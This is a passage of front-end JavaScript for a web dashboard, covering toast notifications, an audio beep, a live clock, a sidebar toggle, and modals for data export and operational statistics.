  el.innerHTML = `<div class="t">${esc(title)}</div><div class="m">${esc(msg)}</div>`;
  document.getElementById('toasts').appendChild(el);
  setTimeout(()=>{ el.style.opacity='0'; el.style.transform='translateX(120%)'; setTimeout(()=>el.remove(),300); }, 4000);
}

function beep(){
  try{
    const ac = new (window.AudioContext||window.webkitAudioContext)();
    const o = ac.createOscillator(); const g = ac.createGain();
    o.connect(g); g.connect(ac.destination);
    o.frequency.value = 880; o.type = 'sine';
    g.gain.setValueAtTime(0.15, ac.currentTime);
    g.gain.exponentialRampToValueAtTime(0.001, ac.currentTime+0.35);
    o.start(); o.stop(ac.currentTime+0.35);
  }catch(e){}
}

function updateClock(){
  const d = new Date();
  const p = n=>String(n).padStart(2,'0');
  document.getElementById('clock').textContent = p(d.getHours())+':'+p(d.getMinutes())+':'+p(d.getSeconds());
}
setInterval(updateClock, 1000);

function toggleSide(){ document.getElementById('side').classList.toggle('open'); }

/* Export view — clicking Export nav triggers export menu */
const _origSwitch = switchView;
switchView = function(v){
  if(v==='export'){
    document.getElementById('modalTitle').textContent = 'DATA EXPORT';
    document.getElementById('modalBody').innerHTML = `
      <div style="display:flex;flex-direction:column;gap:12px">
        <button class="lock-btn" onclick="exportJSON()">📥 EXPORT AS JSON</button>
        <button class="lock-btn" style="background:linear-gradient(135deg,var(--cyan),#2aa8cc)" onclick="exportCSV()">📊 EXPORT AS CSV</button>
      </div>`;
    document.getElementById('modalBg').classList.add('on');
    return;
  }
  if(v==='stats'){
    const s = computeStats();
    const rows = Object.entries(s).map(([k,v])=>`<div class="kv"><div class="k">${k}</div><div class="v">${v}</div></div>`).join('');
    document.getElementById('modalTitle').textContent = 'OPERATIONAL STATS';
    document.getElementById('modalBody').innerHTML = rows;
    document.getElementById('modalBg').classList.add('on');
    return;
  }
  _origSwitch(v);
};

/* keyboard */
document.addEventListener('keydown', e=>{
  if(e.key==='Escape') closeModal();
});
